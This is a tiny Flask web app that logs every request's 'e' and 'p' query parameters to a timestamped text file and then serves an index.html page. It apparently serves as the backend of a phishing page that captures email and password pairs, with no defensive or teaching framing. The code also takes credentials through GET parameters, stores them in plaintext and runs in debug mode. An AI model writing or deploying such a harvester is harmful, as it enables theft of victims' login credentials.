from flask import Flask,request,render_template 
from time import ctime
app = Flask(__name__)

@app.route("/",methods=["GET","POST"])
def index():
    r = request.args
    with open(ctime()+".txt","w") as z:
        z.write(r["e"]+":"+r["p"])
    return render_template("index.html")


if __name__=="__main__":
    app.run(debug=True)
